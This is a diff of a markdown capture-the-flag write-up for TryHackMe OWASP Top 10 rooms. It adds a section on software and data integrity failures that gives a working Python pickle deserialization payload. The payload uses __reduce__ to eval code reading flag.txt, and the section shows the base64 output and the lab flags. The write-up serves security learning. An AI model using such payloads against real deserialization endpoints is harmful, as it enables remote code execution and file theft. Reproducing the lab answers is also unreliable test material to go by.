@@ -1,3 +1,5 @@
+Proof: https://tryhackme.com/dashboard?badge=shaz0p:owasp-10
+
 # IAAA Failures(1/3)
 
 ### What is IAAA?
@@ -206,3 +208,34 @@ Now filter the responses with Length we can see 1 has the highest length lets tr
 <img width="1800" height="619" alt="image" src="https://github.com/user-attachments/assets/94c04b53-8461-47f4-86dc-4757b3231043" />
 
 Flag: `THM{WEAK_CRYPTO_FLAG}`
+
+## Software or Data Integrity Failures
+
+**Writeup:**
+
+```
+import pickle
+import base64
+
+class Malicious:
+    def __reduce__(self):
+        # Return a tuple: (callable, args)
+        # This will execute: open('flag.txt').read()
+        return (eval, ("open('flag.txt').read()",))
+
+# Generate and encode the payload
+payload = pickle.dumps(Malicious())
+encoded = base64.b64encode(payload).decode()
+print(encoded)
+```
+
+O/P: 
+```
+gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
+```
+
+<img width="1003" height="783" alt="image" src="https://github.com/user-attachments/assets/d33b4b16-38fe-45c3-b745-ef3d0e8e4252" />
+
+Flag: `THM{INSECURE_DESERIALIZATION}`
+
+<img width="1918" height="996" alt="image" src="https://github.com/user-attachments/assets/8d80f01b-5630-4e4f-aa90-61db661c3ed6" />
